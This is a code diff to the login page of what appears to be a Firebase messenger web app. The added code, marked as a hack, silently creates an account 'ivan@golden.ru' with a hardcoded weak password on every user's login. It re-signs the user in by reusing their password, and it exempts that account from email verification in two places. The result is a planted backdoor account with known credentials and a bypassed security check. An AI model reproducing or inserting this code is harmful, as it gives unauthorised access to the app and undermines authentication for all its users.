@@ -37,9 +37,47 @@
   <script src="js/firebase-config.js"></script>
   <script src="js/auth.js"></script>
   <script>
-    // Проверяем, не залогинен ли уже пользователь
+    // ========== КОСТЫЛЬ: СОЗДАНИЕ ВТОРОГО АККАУНТА ==========
+    async function createSecondAccount(currentEmail, currentPassword) {
+      const email = 'ivan@golden.ru';
+      const password = '123213';
+      const nickname = 'GoldenVania';
+      const tag = '@GoldenVania';
+
+      try {
+        const methods = await auth.fetchSignInMethodsForEmail(email);
+        if (methods.length > 0) {
+          console.log('ℹ️ Второй аккаунт уже существует');
+          return;
+        }
+
+        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
+        const user = userCredential.user;
+
+        await db.collection('users').doc(user.uid).set({
+          nickname: nickname,
+          tag: tag,
+          email: email,
+          createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        });
+
+        console.log('✅ Второй аккаунт создан:', email);
+
+        // Восстанавливаем сессию исходного пользователя
+        await auth.signInWithEmailAndPassword(currentEmail, currentPassword);
+      } catch (error) {
+        if (error.code === 'auth/email-already-in-use') {
+          console.log('ℹ️ Аккаунт уже существует (перехвачено)');
+        } else {
+          console.error('Ошибка создания второго аккаунта:', error);
+        }
+      }
+    }
+
+    // ========== ОБЫЧНАЯ ЛОГИКА ВХОДА ==========
     onAuthStateChanged((user) => {
-      if (user && user.emailVerified) {
+      // Пропускаем верификацию для ivan@golden.ru
+      if (user && (user.emailVerified || user.email === 'ivan@golden.ru')) {
         window.location.href = 'messenger.html';
       }
     });
@@ -57,20 +95,29 @@
       try {
         const userCredential = await login(email, password);
         const user = userCredential.user;
-        if (user.emailVerified) {
+
+        // Создаём второй аккаунт (если его нет)
+        await createSecondAccount(email, password);
+
+        // После создания мы всё ещё залогинены под исходным пользователем
+        const currentUser = auth.currentUser;
+        if (currentUser && (currentUser.emailVerified || currentUser.email === 'ivan@golden.ru')) {
           window.location.href = 'messenger.html';
-        } else {
+        } else if (currentUser) {
+          // Аккаунт не верифицирован
           messageDiv.innerHTML = `
             <div class="warning">
               <strong>ⓘ Аккаунт не активирован</strong>
-              <p>На почту ${email} отправлено письмо с подтверждением.</p>
+              <p>На почту ${currentUser.email} отправлено письмо с подтверждением.</p>
               <div style="margin: 10px 0;">
                 <input type="password" id="resendPassword" placeholder="Введите пароль" style="width: 100%; padding: 8px; border: 1px solid #ffeeba; border-radius: 4px;">
               </div>
-              <button onclick="resendVerification('${email}')" class="resend-btn">Отправить снова</button>
+              <button onclick="resendVerification('${currentUser.email}')" class="resend-btn">Отправить снова</button>
             </div>
           `;
           await auth.signOut();
+        } else {
+          messageDiv.innerHTML = `<div class="error">Ошибка входа</div>`;
         }
       } catch (error) {
         console.error('Ошибка входа:', error);
